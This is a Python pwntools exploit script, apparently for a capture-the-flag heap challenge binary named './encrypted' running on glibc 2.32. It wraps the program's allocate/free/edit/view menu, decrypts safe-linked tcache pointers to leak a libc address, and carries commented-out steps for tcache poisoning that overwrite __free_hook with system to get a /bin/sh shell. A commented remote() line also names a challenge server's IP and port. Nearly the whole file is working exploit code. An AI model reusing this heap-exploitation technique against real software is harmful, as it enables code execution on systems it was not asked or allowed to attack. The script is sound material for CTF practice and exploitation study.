import pwn
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

# pwn.context.arch = "amd64"
# elf = pwn.context.binary = pwn.ELF("./spaghetti")
# for link in elf.symbols:
#     print(link)
# print(elf.sym.__libc_system) 
# print(elf.sym.__free_hook)
pwn.context.terminal = ['tmux', 'splitw', '-h']
binaryname = "./encrypted"

#p=process(binaryname)
#p=remote("207.154.239.148", 1369)
p=pwn.gdb.debug(binaryname, gdbscript=gs)
# p=pwn.gdb.debug(binaryname)
# p=pwn.process(binaryname)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    # r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = pwn.u64(paddedleak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
#glibc 2.32 tcache addresses are stored as address ^ (chunk_address>>12)

print("malloc-ing")
malloc(0, 1049) # malloc first big chunk
malloc(1, 24)
free(0)
malloc(0, 1070) # malloc slightly larger chunk
malloc(2, 24)
malloc(3, 24)
# malloc(2, 24, b"/bin/sh") 
print("free-ing")
free(0)

leak = decrypt(readLeak(view(0)))
print(hex(leak))



# glibc_base = leak - 0x1ecbe0

freehook_offset = 0x001e6e40

system_offset = 0x000503c0

# system_address = glibc_base + system_offset

# freehook_address = glibc_base + freehook_offset

# free(1)
# free(2)
# edit(3, b"/bin/sh")
# edit(2, pwn.p64(freehook_address))
# malloc(10, 24)
# malloc(11, 24)
# edit(11, pwn.p64(system_address))
# free(3)


# p.interactive()